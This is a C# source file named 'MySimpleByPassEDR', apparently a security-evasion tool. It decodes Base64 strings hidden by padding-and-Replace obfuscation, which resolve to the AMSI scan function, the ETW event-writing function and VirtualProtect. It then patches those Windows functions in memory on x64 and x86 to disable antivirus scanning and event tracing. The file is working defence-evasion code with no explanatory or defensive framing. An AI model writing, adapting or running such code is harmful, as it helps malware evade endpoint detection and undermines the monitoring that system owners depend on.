using System;
using System.Runtime.InteropServices;
using System.Text;

namespace DebuggerConsole
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            MySimpleByPassEDR.ByPass.Edr();
        }
    }
}

namespace MySimpleByPassEDR
{
    public class ByPass
    {
        public static void Edr()
        {
            CheckOs(true);
        }

        protected static void CheckOs(bool security)
        {
            if (security)
            {
                if (Is64Bit())
                {
                    PatchMemory(DecodeBase64(ObfStr.NameDllAmsi()), DecodeBase64(ObfStr.FonctionDllAmsi()),
                        GetBytes(ObfStr.X64PatchDllAmsi()));
                    PatchMemory(DecodeBase64(ObfStr.NameDllEtw()), DecodeBase64(ObfStr.FonctionDllEtw()),
                        GetBytes(ObfStr.X64PatchDllEtw()));
                }
                else if (!Is64Bit())
                {
                    PatchMemory(DecodeBase64(ObfStr.NameDllAmsi()), DecodeBase64(ObfStr.FonctionDllAmsi()),
                        GetBytes(ObfStr.X86PatchDllAmsi()));
                    PatchMemory(DecodeBase64(ObfStr.NameDllEtw()), DecodeBase64(ObfStr.FonctionDllEtw()),
                        GetBytes(ObfStr.X86PatchDllEtw()));
                }
            }
        }

        protected static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
        {
            IntPtr library = Win32.LoadLibraryA(ref nameDll);
            IntPtr procAddress = Win32.GetProcAddress(library,ref nameFonction);
            uint output;
            Win32.VirtualAllocEx(procAddress, (UIntPtr)patch.Length, 0x40, out output);
            Marshal.Copy(patch, 0, procAddress, patch.Length);
        }

        protected static bool Is64Bit()
        {
            if (IntPtr.Size == 8)
            {
                return true;
            }

            return false;
        }

        protected static string DecodeBase64(string input)
        {
            return Encoding.ASCII.GetString(Convert.FromBase64String(input));
        }

        protected static byte[] GetBytes(string input)
        {
            return Encoding.ASCII.GetBytes(input);
        }
    }
    internal class Win32
    {
        // Token: 0x0600002C RID: 44
        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

        // Token: 0x0600002D RID: 45
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

        // Token: 0x0600002E RID: 46 RVA: 0x000021A1 File Offset: 0x000003A1
        public static TCreateApi LoadApi<TCreateApi>(string name, string method)
        {
            return (TCreateApi)((object)Marshal.GetDelegateForFunctionPointer(Win32.GetProcAddress(Win32.LoadLibraryA(ref name), ref method), typeof(TCreateApi)));
        }

        // Token: 0x04000021 RID: 33
        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String(ObfStr.VProtect())));

        // Token: 0x02000008 RID: 8
        // (Invoke) Token: 0x06000032 RID: 50
        public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    static class ObfStr
    {
        public static string NameDllEtw()
        {
            string input = "";
            input += "DXaCGMesMglq8en8rjAxdoorJWcWbnRkbGwuZGDXaCGMesMglq8en8rjAxdoorJWcW".Replace(
                "DXaCGMesMglq8en8rjAxdoorJWcW", "");
            input += "DXaCGMesMglq8en8rjAxdoorJWcWxsDXaCGMesMglq8en8rjAxdoorJWcW".Replace(
                "DXaCGMesMglq8en8rjAxdoorJWcW", "");
            return input;
        }

        public static string FonctionDllEtw()
        {
            string input = "";
            input +=
                "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiXRXR3RXZlbnzRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX"
                    .Replace(
                        "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX",
                        "");
            input +=
                "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiXRXcml0ZQ==zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX"
                    .Replace(
                        "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX",
                        "");

            return input;
        }

        public static string X64PatchDllEtw()
        {
            string input = "";
            input += "FAen5bPhXIVkrM1tDT4CzXkHhxYZ21BLD4SDPAww==FAen5bPhXIVkrM1tDT4CzXkHhxYZ21BLD4".Replace(
                "FAen5bPhXIVkrM1tDT4CzXkHhxYZ21BLD4", "");
            return input;
        }

        public static string X86PatchDllEtw()
        {
            string input = "";
            input +=
                "r1BNlgQ4sH11oCjiY0sxOlALI8nifGgBjVplqFKaWps7PyaMZupWyGvF0zFm3sYll0SSX81SqRai3C6TiaIvbKMcjku0AhhoQGWYgHzb2WphqNMx3vEdjnKbo0swNARJuvRwqhxakr2EepvWX67PcEFn55uqYCN1Egx45ZHV7o21uG69EWZRDCqM8DCFAA=r1BNlgQ4sH11oCjiY0sxOlALI8nifGgBjVplqFKaWps7PyaMZupWyGvF0zFm3sYll0SSX81SqRai3C6TiaIvbKMcjku0AhhoQGWYgHzb2WphqNMx3vEdjnKbo0swNARJuvRwqhxakr2EepvWX67PcEFn55uqYCN1Egx45ZHV7o21uG69EWZRDCq"
                    .Replace(
                        "r1BNlgQ4sH11oCjiY0sxOlALI8nifGgBjVplqFKaWps7PyaMZupWyGvF0zFm3sYll0SSX81SqRai3C6TiaIvbKMcjku0AhhoQGWYgHzb2WphqNMx3vEdjnKbo0swNARJuvRwqhxakr2EepvWX67PcEFn55uqYCN1Egx45ZHV7o21uG69EWZRDCq",
                        "");
            return input;
        }

        public static string NameDllAmsi()
        {
            string input = "";
            input +=
                "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjFYW1zaS5kbG5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF"
                    .Replace(
                        "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF",
                        "");
            input +=
                "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjFw=5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF"
                    .Replace(
                        "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF",
                        "");

            return input;
        }

        public static string FonctionDllAmsi()
        {
            string input = "";
            input +=
                "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvRQW1zaVNjYWfoP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR"
                    .Replace(
                        "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR",
                        "");
            input +=
                "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR5CdWZmZXI=foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR"
                    .Replace(
                        "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR",
                        "");

            return input;
        }

        public static string X64PatchDllAmsi()
        {
            string input = "";
            input +=
                "erFdIbjDNnns2bcNotuRcipxpe4SNMjMl53RKfMnGJXgXHodPgQK9df6BRxohQzADbH6iLDJgHKSKJZizaDq6ZMHa6Q2riGzUWc6As5EdGn2SNw21PyGNIEoO9gl4Kb8AU7yqchuFcAB4DDerFdIbjDNnns2bcNotuRcipxpe4SNMjMl53RKfMnGJXgXHodPgQK9df6BRxohQzADbH6iLDJgHKSKJZizaDq6ZMHa6Q2riGzUWc6As5EdGn2SNw21PyGNIEoO9gl4Kb8AU7yqch"
                    .Replace(
                        "erFdIbjDNnns2bcNotuRcipxpe4SNMjMl53RKfMnGJXgXHodPgQK9df6BRxohQzADbH6iLDJgHKSKJZizaDq6ZMHa6Q2riGzUWc6As5EdGn2SNw21PyGNIEoO9gl4Kb8AU7yqch",
                        "");

            return input;
        }

        public static string X86PatchDllAmsi()
        {
            string input = "";
            input +=
                "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSduFcAB4DCGAlAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd"
                    .Replace(
                        "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd",
                        "");
            input +=
                "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSdA=lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd"
                    .Replace(
                        "lAMshRDsh3QB4fF19cl8IdOD86RvUINuf1LiRiXUNDWQk3RH9fU2h48IwJtlARYYqgfDThjaFRuEG7dEoJwzxUMk3DwHzwT5p8kDYOyc53wQJ3Byqo60fjkVT4JPvclT7yYIXZqaVT33i6a9C7bKzdZGXOtdEirdSd",
                        "");

            return input;
        }

        public static string VProtect()
        {
            string input = "";
            input += "VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSkVmlydHVhbFVUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk".Replace("VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk","");
            input += "VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSkByb3RlY3Q=VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk".Replace("VUlpggLBg77gfIoXlik4kfHlKsTTB6Dt1OEmAomxNRK1tD9BY6xMtCM0N9fyN29j3OoQECW66xqSUQ1GsR4EJ0AzCOZBJykVSk","");

            return input;
        }
    }
}